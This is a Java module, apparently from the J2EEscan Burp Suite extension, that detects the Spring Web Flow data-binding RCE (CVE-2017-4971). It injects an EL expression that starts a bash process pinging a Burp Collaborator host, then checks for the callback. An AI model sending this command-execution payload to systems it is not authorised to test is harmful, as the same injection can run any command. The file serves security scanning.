package burp.j2ee.issues.impl;

import static burp.HTTPMatcher.isJavaApplicationByURL;
import burp.HTTPParser;
import static burp.HTTPParser.isJSONRequest;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IParameter;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

/**
 *
 * Data Binding Expression Vulnerability in Spring Web Flow - CVE-2017-4971
 *
 *
 */
public class SpringWebFlowDataBindExpressionCVE20174971 implements IModule {

    private static final String TITLE = "Data Binding Expression Vulnerability in Spring Web Flow - CVE-2017-4971";
    private static final String DESCRIPTION = "J2EEscan identified a remote command execution on Spring Web Flow component.<br />"
            + "Applications that do not change the value of the <code>MvcViewFactoryCreator useSpringBinding</code> property br />"
            + "which is disabled by default can be vulnerable to malicious EL expressions in view states."
            + "<br /><br />"
            + "<b>References</b>:<br />"
            + "https://jira.spring.io/browse/SWF-1700<br />"
            + "https://github.com/spring-projects/spring-webflow/commit/57f2ccb66946943fbf3b3f2165eac1c8eb6b1523<br />"
            + "https://github.com/spring-projects/spring-webflow/commit/ec3d54d2305e6b6bce12f770fec67fe63008d45b";

    private static final String REMEDY = "Upgrade the Spring Web Flow library";

    private PrintWriter stderr;
    private PrintWriter stdout;

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        byte[] modifiedRawRequest = null;
        
        URL url = reqInfo.getUrl();

        List<IScanIssue> issues = new ArrayList<>();

        if (!isJavaApplicationByURL(url)) {
            return issues;
        }

        String contentTypeHeader = HTTPParser.getRequestHeaderValue(reqInfo, "Content-type");

        // Skip not POST request and request with JSON elements
        if (contentTypeHeader == null) {
            return issues;
        }
        if (isJSONRequest(contentTypeHeader)) {
            return issues;
        }

        List<String> headers = reqInfo.getHeaders();
        String request = helpers.bytesToString(baseRequestResponse.getRequest());
        String requestBody = request.substring(reqInfo.getBodyOffset());

        String injection = "_(new java.lang.ProcessBuilder(\"bash\",\"-c\",\"ping -c 3 %s\")).start()";

        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

        String payloadSpringDataBind = String.format(injection, currentCollaboratorPayload);

        byte[] rawrequest = baseRequestResponse.getRequest();

        modifiedRawRequest = callbacks.getHelpers().addParameter(rawrequest,
                callbacks.getHelpers().buildParameter(payloadSpringDataBind,
                        "j2eescan", IParameter.PARAM_BODY)
        );

        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), modifiedRawRequest);


        // Poll Burp Collaborator for remote interaction
        List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

        if (!collaboratorInteractions.isEmpty()) {
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    reqInfo.getUrl(),
                    checkRequestResponse,
                    TITLE,
                    DESCRIPTION,
                    REMEDY,
                    Risk.High,
                    Confidence.Certain
            ));
        }

        return issues;

    }
}
